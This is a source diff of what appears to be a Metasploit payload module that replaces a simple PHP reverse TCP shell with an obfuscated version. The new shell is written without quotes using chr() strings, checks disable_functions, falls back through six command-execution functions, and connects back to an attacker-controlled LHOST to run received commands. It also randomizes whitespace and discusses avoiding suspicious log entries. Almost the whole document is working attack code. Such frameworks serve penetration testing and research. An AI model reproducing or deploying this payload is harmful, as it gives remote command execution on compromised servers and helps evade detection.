@@ -1,5 +1,5 @@
 ##
-# $Id:$
+# $Id$
 ##
 
 ##
@@ -27,8 +27,8 @@ module ReversePhp
 		super(merge_info(info,
 			'Name'          => 'PHP Command Shell, Reverse TCP (via php)',
 			'Version'       => '$Revision$',
-			'Description'   => 'Reverse PHP connect back shell',
-			'Author'        => ['diaul <diaul@devilopers.org>',],
+			'Description'   => 'Reverse PHP connect back shell with checks for disabled functions',
+			'Author'        => 'egypt <egypt@nmt.edu>',
 			'License'       => BSD_LICENSE,
 			'Platform'      => 'php',
 			'Arch'          => ARCH_PHP,
@@ -43,43 +43,144 @@ module ReversePhp
 			))
 	end
 
-
-
-
 	#
-	# PHP Reverse Shell
+	# PHP Reverse Shell completely without quotes.  Strings and regexes
+	# are replaced with chr() equivalents and the IP address to connect to is
+	# replaced with integer equivalent wrapped in long2ip().  
+	#
+	# Attempts to make a connection back to the attacker using fsockopen or
+	# socket_create and associated functions.  Then attempts to execute a
+	# system command with the following functions, in order:
+	#	- shell_exec
+	#	- passthru
+	#	- system
+	#	- exec
+	#	- proc_open
+	#	- popen
+	#
+	# Issues
+	#   - Since each command is executed in a new shell, 'cd' does nothing.
+	#      Perhaps it should be special-cased to call chdir()
+	#   - Tries to get around disable_functions but makes no attempts to 
+	#      circumvent safe mode.  
+  	#   - Should this add '2>&1' to the end of the executed command to avoid
+	#      logging suspicious error messages?
 	#
 	def php_reverse_shell
 
-	        #
-       		# inet_aton to bypass magic quotes protection for eval() vulnerarilities 
-        	#
+		ipaddr = datastore['LHOST'].split(/\./).map{|c| c.to_i}.pack("C*").unpack("N").first
+		port = datastore['LPORT']
 
-        	if datastore['LHOST']
-            		ipaddr = datastore['LHOST'].split(/\./).map{|c| c.to_i}.pack("C*").unpack("N").first
-        	end
+		#
+		# The regex looks like this unobfuscated:
+		#   preg_replace('/[, ]+/', ',', $disabled);
+		#
+		shell=<<-END_OF_PHP_CODE
+		$ipaddr=long2ip(#{ipaddr});
+		$port=#{port};
+		$_=chr(95);$a=chr(97);$b=chr(98);$c=chr(99);$d=chr(100);$e=chr(101);
+		$f=chr(102);$h=chr(104);$i=chr(105);$l=chr(108);$m=chr(109);$n=chr(110);
+		$o=chr(111);$p=chr(112);$r=chr(114);$s=chr(115);$t=chr(116);$u=chr(117);
+		$x=chr(120);$y=chr(121);
+		$disabled=@ini_get($d.$i.$s.$a.$b.$l.$e.$_.$f.$u.$n.$c.$t.$i.$o.$n.$s);
+		if(!empty($disabled)){
+			$disabled=preg_replace(chr(47).chr(91).chr(44).chr(32).chr(93).chr(43).chr(47),chr(44),$disabled);
+			$disabled=explode(chr(44),$disabled);
+			$disabled=array_map($t.$r.$i.$m,$disabled);
+		}else{
+			$disabled=array();
+		}
+		@set_time_limit(0);
+		@ini_set($m.$a.$x.$_.$e.$x.$e.$c.$u.$t.$i.$o.$n.$_.$t.$i.$m.$e,0);
+		function myexec($cmd){
+			global$disabled,$_,$a,$c,$e,$h,$m,$n,$o,$p,$r,$s,$t,$u,$x,$y;
+			if(is_callable($s.$h.$e.$l.$l.$_.$e.$x.$e.$c)and!in_array($s.$h.$e.$l.$l.$_.$e.$x.$e.$c,$disabled)){
+				$output=shell_exec($cmd);
+				return$output;
+			}elseif(is_callable($p.$a.$s.$s.$t.$h.$r.$u)and!in_array($p.$a.$s.$s.$t.$h.$r.$u,$disabled)){
+				ob_start();
+				passthru($cmd);
+				$output=ob_get_contents();
+				ob_end_clean();
+				return$output;
+			}elseif(is_callable($s.$y.$s.$t.$e.$m)and!in_array($s.$y.$s.$t.$e.$m,$disabled)){
+				ob_start();
+				system($cmd);
+				$output=ob_get_contents();
+				ob_end_clean();
+				return$output;
+			}elseif(is_callable($e.$x.$e.$c)and!in_array($e.$x.$e.$c,$disabled)){
+				$output=array();
+				exec($cmd,$output);
+				$output=join(chr(10),$output).chr(10);
+				return$output;
+			}elseif(is_callable($p.$r.$o.$c.$_.$o.$p.$e.$n)and!in_array($p.$r.$o.$c.$_.$o.$p.$e.$n,$disabled)){
+				$handle=proc_open($cmd,array(array(pipe,r),array(pipe,w),array(pipe,w)),$pipes);
+				$output=NULL;
+				while(!feof($pipes[1])){
+					$output.=fread($pipes[1],1024);
+				}
+				@proc_close($handle);
+				return$output;
+			}elseif(is_callable($p.$o.$p.$e.$n)and!in_array($p.$o.$p.$e.$n,$disabled)){
+				$fp=popen($cmd,r);
+				$output=NULL;
+				if(is_resource($fp)){
+					while(!feof($fp)){
+						$output.=fread($fp,1024);
+					}
+				}
+				@pclose($fp);
+				return$output;
+			}else{
+				return false;
+			}
+		}
+		$command=NULL;
+		$nofuncs=$n.$o.chr(32).$e.$x.$e.$c.chr(32).$f.$u.$n.$c.$t.$i.$o.$n.$s.chr(32).chr(61).chr(40);
+		if(is_callable(@f.@s.@o.@c.@k.@o.@p.@e.@n)and!in_array(@f.@s.@o.@c.@k.@o.@p.@e.@n,$disabled)){
+			$sock=fsockopen($ipaddr,$port);
+			while($cmd=fread($sock,2048)){
+				$output=myexec(substr($cmd,0,-1));
+				if($output===false){
+					fwrite($sock,$nofuncs);
+					break;
+				}
+				fwrite($sock,$output);
+			}
+			fclose($sock);
+		}else{
+			$sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
+			socket_connect($sock,$ipaddr,$port);
+			while($cmd=socket_read($sock,2048)){
+				$output=myexec(substr($cmd,0,-1));
+				if($output===false){
+					socket_write($sock,$nofuncs);
+					break;
+				}
+				socket_write($sock,$output,strlen($output));
+			}
+			socket_close($sock);
+		}
+		END_OF_PHP_CODE
 
-		shell = <<-END_OF_PHP_CODE
-		error_reporting(E_ALL);
-		$service_port = #{datastore['LPORT']};
-
-		$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-		$result = socket_connect($socket, #{ipaddr}, $service_port);
-
-		$command = NULL;
-
-		while ($command = socket_read($socket, 2048)) {
-        		$output = shell_exec(substr($command, 0, -1));
-        		socket_write($socket, $output, strlen($output));
+		shell.gsub!(/[\t\n]+/, "\t")
+		# spaces are important but there's no need for tabs and newlines, so
+		# randomize them bit
+		shell.gsub!("\t") { |s|
+			len = rand(5)+2
+			set = "\x09\x20\x0d\x0a"
+			buf = ''
+			
+			while (buf.length < len)
+				buf << set[rand(set.length)].chr
+			end
+			
+			buf
 		}
 
-		socket_close($socket);
-		END_OF_PHP_CODE
-		
 		return shell
-
 	end
-
 
 	#
 	# Constructs the payload
